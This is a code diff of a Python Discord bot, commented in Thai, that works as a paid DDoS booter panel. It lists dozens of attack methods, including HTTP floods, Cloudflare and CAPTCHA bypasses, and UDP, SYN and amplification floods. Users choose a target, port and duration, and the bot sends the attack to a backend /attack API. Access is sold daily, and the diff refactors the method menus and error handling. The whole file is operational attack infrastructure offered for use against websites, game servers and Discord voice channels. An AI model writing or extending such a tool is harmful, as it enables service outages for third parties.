@@ -1,5 +1,6 @@
 # bot.py — valan discord bot
-# FREEFIRE = method หนึ่งใน L4 · VC_DISCORD = method ใน ALL_METHODS
+# FREEFIRE รวมใน L4 · VC_DISCORD อยู่ใน ALL_METHODS
+# L7 = 26 methods → split เป็น 2 selects (Discord cap = 25/select)
 import asyncio, time, re, aiohttp, discord
 from discord.ext import commands
 import db
@@ -14,59 +15,60 @@ intents.message_content = True
 intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
-# ---- L7 methods ----
+# ---- L7 methods (26) ----
 L7_LIST = [
-    "GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW",
-    "HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE",
-    "XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR",
+    "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER", "SLOW",
+    "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT",
+    "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", "KILLER", "TOR",
 ]
 
-# ---- L4 methods — FREEFIRE รวมอยู่แล้ว ----
+# ---- L4 methods (22) — FREEFIRE รวมอยู่ ----
 L4_LIST = [
-    "TCP","UDP","SYN","OVH-UDP","CPS","ICMP","CONNECTION",
-    "VSE","TS3","FIVEM","FIVEM-TOKEN","MEM","NTP","MCBOT","MINECRAFT",
-    "MCPE","DNS","CHAR","CLDAP","ARD","RDP",
-    "FREEFIRE",   # ← รวมใน L4
+    "TCP", "UDP", "SYN", "OVH-UDP", "CPS", "ICMP", "CONNECTION",
+    "VSE", "TS3", "FIVEM", "FIVEM-TOKEN", "MEM", "NTP", "MCBOT", "MINECRAFT",
+    "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
+    "FREEFIRE",
 ]
 
-# ---- category list ----
-# VC ยังอยู่ใน top-level เพื่อ shortcut — FREEFIRE ก็ยังมี shortcut
-# แต่ตัว method เองอยู่ใน L4 select ด้านในด้วย
 CATEGORY_LIST = [
     ("L7",          " L7 — ยิงเว็บ (HTTP)"),
-    ("L4",          " L4 — ยิงเกม (TCP/UDP) — รวม Free Fire"),
+    ("L4",          " L4 — ยิงเกม (TCP/UDP) -m"),
     ("VC",          " VC Discord — ยิงห้องเสียง"),
-    ("FF",          " Free Fire — shortcut ตรง"),
-    ("HTTPS",       "⚡ ddos-https — massive RPS"),
+    ("HTTPS",       " ddos-https — massive RPS"),
     ("HTTPSLOAD",   " ddos-httpsload — HTTP Flood"),
-    ("BYBROWSER",   " ddos by-browser — HTTP/2 จำลอง Browser (เลี่ยง UAM/CAPTCHA)"),
-    ("HTTPSBYPASS", " ddos-https-bypass — HTTP/2 เลี่ยง Cloudflare"),
-    ("CDNBYPASS",   " ddos-cdn-bypass — HTTP/2 สำหรับ enterprise (ไม่ใช่ CF)"),
+    ("BYBROWSER",   " ddos by-browser — Browser"),
+    ("HTTPSBYPASS", " ddos-https-bypass — Cloudflare"),
+    ("CDNBYPASS",   " ddos-cdn-bypass — HTTP enterprise"),
 ]
 
 def forbidden_target(t: str):
     s = t.lower().strip()
-    if s in ("localhost", "127.0.0.1", "::1"): return "Local IP"
-    if re.match(r"^127\.", s) or re.match(r"^10\.", s) or \
-       re.match(r"^192\.168\.", s) or \
-       re.match(r"^172\.(1[6-9]|2[0-9]|3[01])\.", s) or \
-       re.match(r"^169\.254\.", s):
+    if s in ("localhost", "127.0.0.1", "::1"):
+        return "Local IP"
+    if (re.match(r"^127\.", s) or re.match(r"^10\.", s)
+            or re.match(r"^192\.168\.", s)
+            or re.match(r"^172\.(1[6-9]|2[0-9]|3[01])\.", s)
+            or re.match(r"^169\.254\.", s)):
         return "Local IP"
     host = s.split("/")[0].split(":")[0]
     for tld in FORBIDDEN_TLDS:
-        if host.endswith(tld): return f"โดเมน {tld} ห้ามยิง"
+        if host.endswith(tld):
+            return f"โดเมน {tld} ห้ามยิง"
     return None
 
 def parse_duration(s: str):
     s = s.strip().lower()
-    if s in ("th", "permanent", "ถาวร", "forever"): return 0
+    if s in ("th", "permanent", "ถาวร", "forever"):
+        return 0
     m = re.match(r"^(\d+)([smhd])$", s)
-    if not m: return None
+    if not m:
+        return None
     n, unit = int(m.group(1)), m.group(2)
-    return int(time.time()) + n * {"s":1,"m":60,"h":3600,"d":86400}[unit]
+    return int(time.time()) + n * {"s": 1, "m": 60, "h": 3600, "d": 86400}[unit]
 
 def fmt_expiry(exp):
-    if exp == 0: return "ถาวร (TH)"
+    if exp == 0:
+        return "ถาวร (TH)"
     return time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime(exp))
 
 def panel_embed():
@@ -100,17 +102,24 @@ class TargetModal(discord.ui.Modal):
         target = self.t_target.value.strip()
         f = forbidden_target(target)
         if f:
-            await interaction.response.send_message(f"❌ {f}", ephemeral=True); return
+            await interaction.response.send_message(f"❌ {f}", ephemeral=True)
+            return
         try:
             port = int(self.t_port.value)
-            if not 1 <= port <= 65535: raise ValueError
+            if not 1 <= port <= 65535:
+                raise ValueError
         except ValueError:
-            await interaction.response.send_message("❌ PORT ไม่ถูกต้อง", ephemeral=True); return
+            await interaction.response.send_message("❌ PORT ไม่ถูกต้อง", ephemeral=True)
+            return
         try:
             dur = int(self.t_time.value)
-            if not 1 <= dur <= MAX_TIME: raise ValueError
+            if not 1 <= dur <= MAX_TIME:
+                raise ValueError
         except ValueError:
-            await interaction.response.send_message(f"❌ TIME ต้องอยู่ 1-{MAX_TIME}", ephemeral=True); return
+            await interaction.response.send_message(
+                f"❌ TIME ต้องอยู่ 1-{MAX_TIME}", ephemeral=True
+            )
+            return
 
         cat = self.category
         if cat in ("L7", "L4"):
@@ -128,32 +137,48 @@ class TargetModal(discord.ui.Modal):
             await launch(interaction, target, port, dur, cat)
 
 class MethodView(discord.ui.View):
+    """
+    Discord Select cap = 25 options
+    L7 = 26 items → split เป็น 2 selects, คนละ row
+    L4 = 22 items → select เดียวพอ
+    """
     def __init__(self, layer, target, port, dur):
-        super().__init__(timeout=120)
+        super().__init__(timeout=180)
         opts = L7_LIST if layer == "L7" else L4_LIST
-        # L4 มี 22 methods — discord limit select = 25 → ปลอดภัย
-        sel = discord.ui.Select(
-            placeholder=f"เลือก {layer} method",
-            options=[discord.SelectOption(label=m, value=m) for m in opts[:25]],
-        )
-        sel.callback = self._pick
-        self.add_item(sel)
         self.target, self.port, self.dur = target, port, dur
 
-    async def _pick(self, interaction: discord.Interaction):
-        method = interaction.data["values"][0]
-        await interaction.response.edit_message(
-            content=f"ยิง {method} ไปที่ `{self.target}:{self.port}` นาน {self.dur}s",
-            view=None,
-        )
-        await launch(interaction, self.target, self.port, self.dur, method)
+        if len(opts) > 25:
+            mid = (len(opts) + 1) // 2
+            groups = [opts[:mid], opts[mid:]]
+        else:
+            groups = [opts]
+
+        for row_idx, group in enumerate(groups):
+            label_suffix = f" ({row_idx + 1}/{len(groups)})" if len(groups) > 1 else ""
+            sel = discord.ui.Select(
+                placeholder=f"เลือก {layer} method{label_suffix}",
+                options=[discord.SelectOption(label=m, value=m) for m in group],
+                row=row_idx,
+            )
+            sel.callback = self._make_pick()
+            self.add_item(sel)
+
+    def _make_pick(self):
+        async def _cb(interaction: discord.Interaction):
+            method = interaction.data["values"][0]
+            await interaction.response.edit_message(
+                content=f"ยิง {method} ไปที่ `{self.target}:{self.port}` นาน {self.dur}s",
+                view=None,
+            )
+            await launch(interaction, self.target, self.port, self.dur, method)
+        return _cb
 
 class CategoryView(discord.ui.View):
     def __init__(self):
-        super().__init__(timeout=120)
+        super().__init__(timeout=180)
         sel = discord.ui.Select(
             placeholder="เลือกประเภทการยิง",
-            options=[discord.SelectOption(label=l, value=v) for v, l in CATEGORY_LIST[:25]],
+            options=[discord.SelectOption(label=l, value=v) for v, l in CATEGORY_LIST],
         )
         sel.callback = self._pick
         self.add_item(sel)
@@ -177,7 +202,8 @@ class PanelButton(discord.ui.View):
             await interaction.response.send_message(
                 "❌ ไม่มีสิทธิ์ใช้ มาซื้อ api วันละ 30 ใช้งานบอทก็วันละ 30 TK มาได้เลยครับ",
                 ephemeral=True,
-            ); return
+            )
+            return
         await interaction.response.send_message(
             "เลือกประเภทการยิง:", view=CategoryView(), ephemeral=True,
         )
@@ -188,7 +214,8 @@ async def launch(interaction: discord.Interaction, target, port, dur, method):
     key = None
     for k, created, exp, active in keys:
         if active and (exp == 0 or exp > int(time.time())):
-            key = k; break
+            key = k
+            break
     if key is None:
         key = db.create_key(user_id, 0)
 
@@ -196,13 +223,24 @@ async def launch(interaction: discord.Interaction, target, port, dur, method):
         params = {"key": key, "target": target, "port": port,
                   "time": dur, "method": method}
         try:
-            async with session.get(f"{API_SELF}/attack", params=params, timeout=10) as r:
+            async with session.get(f"{API_SELF}/attack", params=params, timeout=15) as r:
+                ctype = r.headers.get("content-type", "")
+                if "application/json" not in ctype:
+                    raw = await r.text()
+                    await interaction.followup.send(
+                        f"❌ API {r.status}: {raw[:200]}", ephemeral=True
+                    )
+                    return
                 data = await r.json()
         except Exception as e:
-            await interaction.followup.send(f"❌ API error: {e}", ephemeral=True); return
+            await interaction.followup.send(f"❌ API error: {e}", ephemeral=True)
+            return
 
     if data.get("status") != "started":
-        await interaction.followup.send(f"❌ {data.get('message','error')}", ephemeral=True); return
+        await interaction.followup.send(
+            f"❌ {data.get('message', 'error')}", ephemeral=True
+        )
+        return
 
     e = discord.Embed(color=PANEL_COLOR)
     e.description = (
@@ -223,36 +261,45 @@ async def on_ready():
 
 @bot.command(name="ddos")
 async def cmd_ddos(ctx):
-    if ctx.author.name != PANEL_USERNAME: return
+    if ctx.author.name != PANEL_USERNAME:
+        return
     await ctx.send(embed=panel_embed(), view=PanelButton())
 
 @bot.command(name="vi")
 async def cmd_vi(ctx, member: discord.Member = None, duration: str = None):
-    if ctx.author.name != PANEL_USERNAME: return
+    if ctx.author.name != PANEL_USERNAME:
+        return
     if not member or not duration:
-        await ctx.send("usage: !vi @user 1h | 1d | TH"); return
+        await ctx.send("usage: !vi @user 1h | 1d | TH")
+        return
     exp = parse_duration(duration)
     if exp is None:
-        await ctx.send("duration ไม่ถูกต้อง (1h / 1d / TH)"); return
+        await ctx.send("duration ไม่ถูกต้อง (1h / 1d / TH)")
+        return
     db.add_vip(member.id, exp)
     await ctx.send(f"✅ {member.mention} ได้สิทธิ์ — หมดอายุ: {fmt_expiry(exp)}")
 
 @bot.command(name="unvi")
 async def cmd_unvi(ctx, member: discord.Member = None):
-    if ctx.author.name != PANEL_USERNAME: return
+    if ctx.author.name != PANEL_USERNAME:
+        return
     if not member:
-        await ctx.send("usage: !unvi @user"); return
+        await ctx.send("usage: !unvi @user")
+        return
     db.remove_vip(member.id)
     await ctx.send(f"✅ ยึดสิทธิ์ {member.mention} แล้ว")
 
 @bot.command(name="api")
 async def cmd_api(ctx, action: str = None, duration: str = None):
-    if ctx.author.name != PANEL_USERNAME: return
+    if ctx.author.name != PANEL_USERNAME:
+        return
     if action != "+1" or not duration:
-        await ctx.send("usage: !api +1 1h | 1d | TH"); return
+        await ctx.send("usage: !api +1 1h | 1d | TH")
+        return
     exp = parse_duration(duration)
     if exp is None:
-        await ctx.send("duration ไม่ถูกต้อง"); return
+        await ctx.send("duration ไม่ถูกต้อง")
+        return
     key = db.create_key(ctx.author.id, exp)
     url = f"{API_PUBLIC}/attack?key={key}&target=TARGET&port=PORT&time=TIME&method=METHOD"
     status_url = f"{API_PUBLIC}/key/{key}"
@@ -268,12 +315,16 @@ async def cmd_api(ctx, action: str = None, duration: str = None):
 
 @bot.command(name="mykeys")
 async def cmd_mykeys(ctx):
-    if ctx.author.name != PANEL_USERNAME: return
+    if ctx.author.name != PANEL_USERNAME:
+        return
     keys = db.list_keys(ctx.author.id)
     if not keys:
-        await ctx.send("ไม่มี key"); return
-    lines = [f"`{k}` — {fmt_expiry(exp)} ({'active' if act else 'off'})"
-             for k, cr, exp, act in keys]
+        await ctx.send("ไม่มี key")
+        return
+    lines = [
+        f"`{k}` — {fmt_expiry(exp)} ({'active' if act else 'off'})"
+        for k, cr, exp, act in keys
+    ]
     await ctx.send("\n".join(lines[:20]))
 
 if __name__ == "__main__":
